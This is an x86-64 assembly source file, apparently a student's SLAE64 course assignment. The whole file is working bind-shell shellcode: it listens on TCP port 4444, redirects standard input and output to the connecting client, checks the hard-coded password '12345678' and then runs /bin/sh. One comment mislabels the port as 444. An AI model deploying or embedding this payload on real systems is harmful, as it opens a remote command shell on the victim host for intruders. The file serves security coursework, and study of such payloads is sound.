; Author: Guillem Alminyana
; Student ID: PA-14628
; SLAE64 Assignment #1: Shell_Bind_TCP
; =====================================
;
; Compile: 
;   nasm -f elf64 BindShell-Execve-Stack.nasm -o BindShell-Execve-Stack.o 


%define AF_INET 2
%define SOCK_STREAM 1
%define INADDR_ANY 0

%define PORT 0x5c11				; Port 444 (htons(4444))

global _start
section .text

_start:

	; socket_id = socket(AF_INET, SOCK_STREAM, 0)

	;mov rax, 41			; syscall number
	push 41
	pop rax

	;mov rdi, AF_INET
	push AF_INET
	pop rdi

	;mov rsi, SOCK_STREAM
	push SOCK_STREAM
	pop rsi

	;mov rdx, 0
	xor rdx, rdx

	syscall

	; Save the socket_id value in RDI for future use
	
	;mov rdi, rax 			; value returned in RAX by syscall
	push rax
	pop rdi

	; Prepare (struct sockaddr *)&server
	;	RSP will point to the struct address
	
	;xor rax, rax
	;push rax			; bzero(&server.sin_zero, 8)
	push rdx			; RDX Zero'ed 4 instructions up

	;mov dword [rsp - 4], INADDR_ANY
	push rdx

	;mov word [rsp - 6], PORT
	push word PORT

	;mov word [rsp - 8], AF_INET
	push word AF_INET

	;sub rsp, 8 			; Update RSP with right value
					; But already updated with the pushes
	
	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	;	RDI already has the sock_id
	
	;mov rax, 49			; syscall number
	push 49
	pop rax

	;mov rsi, rsp			; @ to (struct sockaddr * &server)
	push rsp
	pop rsi

	;mov rdx, 16			; length of the sockaddr struct
	mov dl, 16

	syscall

	; listen(sock, MAX_CLIENTES
	;	RDI already has the sock_id
	
	;mov rax, 50			; syscall number
	push 50
	pop rax

	;mov rsi, 2
	push 2
	pop rsi

	syscall

	; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
	; 	RDI already has the sock_id

	;mov rax, 43			; syscall number
	push 43
	pop rax
	
	;	Reserve space on the stack for the struct (16 bytes)

	sub rsp, 16			; Reserved 16 bytes

	;mov rsi, rsp			; RSI <- @ sockaddr struct
	push rsp
	pop rsi

	;	Store in the Stack the sockaddr_len value

	;mov byte [rsp - 1], 16		; Stored the len (16 bytes)
	;sub rsp, 1			; Update value for RSP
	push byte 16

	;mov rdx, rsp			; RDX <- @sockaddr_len
	push rsp
	pop rdx

	syscall

	; Store the client socket descripion returned by accept

	;mov rbx, rax			; r9 <- client_sock
	push rax
	pop rbx

	; Close the parent socket_id

	;mov rax, 3			; syscall number
	push 3
	pop rax

	syscall				

	; Sockets duplication

	;mov rdi, rbx			; RDI <- Client socket_id
	push rbx
	pop rdi

	push 2
	pop rsi
loop_1:
	push 33
	pop rax
	
	syscall

	dec rsi
	jns loop_1

	; Here starts the password stuff

password_check:

write_syscall:

        ;mov rax, 1                             ; Syscall number for write()
        push 1
        pop rax

        ; rdi still keeps the sicket_id, we write() to the socket

        ;lea rsi, [rel PASSWD_PROMPT]           ; Rel addressing to prompt
        mov r9, "Passwd: "
        push r9
        mov rsi, rsp

        ;mov rdx, 8                             ; Length of PAsswd: string
        push 8
        pop rdx

        syscall

read_syscall:

        xor rax, rax                            ; Syscall number for read()
        ; rdi keeps the socket_id, we read() from it

        ; Where to store the input passwd
        add rsi, 8                              ; Replace "Passwd: " with the input in the stack

        ;mov rdx, 8                             ; Chars to read
        ;rdx already has value 8 from before

        syscall

compare_passwords:

        mov rax, "12345678"                     ; Thgis is the password

        ;lea rdi, [rel PASSWD_INPUT]            ; Compare the QWord

        ;mov rdi, rsi
        push rsi                                ; rsi points to PASSWD_INPUT
        pop rdi

        scasq
        jne exit_program                        ; Passwords don't match, exit



	; execve SYSCALL
	; --------------
execve_syscall:

	; First NULL push

	xor rax, rax
	push rax

	; push /bin//sh in reverse

	mov rbx, 0x68732f2f6e69622f
	push rbx
	;push dword 0x6e69622f
	;push dword 0x68732f2f

	; store /bin//sh address in RDI

	;mov rdi, rsp
	push rsp
	pop rdi

	; Second NULL push
	push rax

	; set RDX
	;mov rdx, rsp
	push rsp
	pop rdx


	; Push address of /bin//sh
	push rdi

	; set RSI
	;mov rsi, rsp
	push rsp
	pop rsi

	; Call the Execve syscall
	;add rax, 59
	push 59
	pop rax

	syscall
	
exit_program:

